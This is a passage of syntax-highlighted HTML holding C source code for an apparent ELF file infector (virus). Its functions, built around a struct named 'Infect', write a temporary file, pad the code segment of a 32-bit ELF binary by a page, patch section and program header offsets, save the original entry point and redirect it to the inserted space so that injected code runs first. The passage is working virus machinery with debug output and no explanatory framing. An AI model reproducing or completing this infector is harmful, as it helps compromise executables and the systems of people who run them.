    </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_dest</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">start</span><span class="sc10">+</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">end_of_codes</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">file_size</span><span class="sc10">-</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">end_of_codes</span><span class="sc10">);</span><span class="sc0">
    
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* --------------------- create_tempf ------------------ */</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">create_tempf</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_dest</span><span class="sc10">=</span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">TEMP_FILE</span><span class="sc10">,</span><span class="sc11">O_WRONLY</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">O_CREAT</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">O_TRUNC</span><span class="sc10">,</span><span class="sc4">0775</span><span class="sc10">))&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">create_tempf</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc9">#ifdef DEBUG_IT
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"....:::: [ create_tempf ] ::::....\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"TEMP_FILE = %s\n"</span><span class="sc10">,</span><span class="sc11">TEMP_FILE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\n"</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc9">#endif  
</span><span class="sc0">    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* ------------------ patch_SHDR ------------------- */</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">patch_SHDR</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Shdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">off_t</span><span class="sc0"> </span><span class="sc11">end_of_code_segment</span><span class="sc10">=</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">end_of_codes</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* move to first entry in the SHDR */</span><span class="sc0">
    </span><span class="sc11">Shdr</span><span class="sc10">=(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">*)(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">start</span><span class="sc10">+</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shoff</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc1">/* patching e_shoff ... */</span><span class="sc0">
    </span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ELF_PAGE_SZ</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* patching sh_offset etc. */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">--,</span><span class="sc11">Shdr</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc10">&gt;=</span><span class="sc11">end_of_code_segment</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">Shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ELF_PAGE_SZ</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">end_of_code_segment</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">Shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ELF_PAGE_SZ</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
</span><span class="sc9">#ifdef DEBUG_IT
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"....:::: [ patch_SHDR ] ::::....\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"(new) e_shoff = 0x%x\n"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shoff</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\n"</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc9">#endif  
</span><span class="sc0">    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
    
       

</span><span class="sc1">/* ------------------- patch_PHDR ------------------ */</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">patch_PHDR</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Elf32_Phdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Phdr</span><span class="sc10">,*</span><span class="sc11">Phdr_CODE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">off_t</span><span class="sc0"> </span><span class="sc11">end_of_code_segment</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">Phdr_CODE</span><span class="sc10">=</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">phdr_code</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Phdr</span><span class="sc10">=</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* patching p_filesz and p_memsz... */</span><span class="sc0">
    </span><span class="sc11">Phdr_CODE</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">p_filesz</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ELF_PAGE_SZ</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Phdr_CODE</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">p_memsz</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ELF_PAGE_SZ</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">end_of_code_segment</span><span class="sc10">=</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">end_of_codes</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">--,</span><span class="sc11">Phdr</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* patching p_offset */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc10">&gt;=</span><span class="sc11">end_of_code_segment</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">Phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ELF_PAGE_SZ</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
</span><span class="sc9">#ifdef DEBUG_IT
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"....:::: [ patch_PHDR ] ::::....\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"(new) p_filesz = 0x%x\n"</span><span class="sc10">,</span><span class="sc11">Phdr_CODE</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">p_filesz</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"(new) p_memsz  = 0x%x\n"</span><span class="sc10">,</span><span class="sc11">Phdr_CODE</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">p_memsz</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif  
</span><span class="sc0">    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
    
</span><span class="sc10">}</span><span class="sc0">
    

</span><span class="sc1">/* ------------------ patch_entry_addr ----------------- */</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">patch_entry_addr</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* save the original entry point ...needed later */</span><span class="sc0">
    </span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">origin_entry</span><span class="sc10">=</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_entry</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* patch entry point address */</span><span class="sc0">
    </span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_entry</span><span class="sc10">=</span><span class="sc11">ALIGN_UP</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">phdr_code</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">phdr_code</span><span class="sc10">-&gt;</span><span class="sc11">p_vaddr</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc9">#ifdef DEBUG_IT
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"....:::: [ patch_entry_addr ] ::::....\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"original entry point = 0x%x\n"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">origin_entry</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"(new) entry point    = 0x%x\n"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_entry</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\n"</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc9">#endif    
</span><span class="sc0">    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
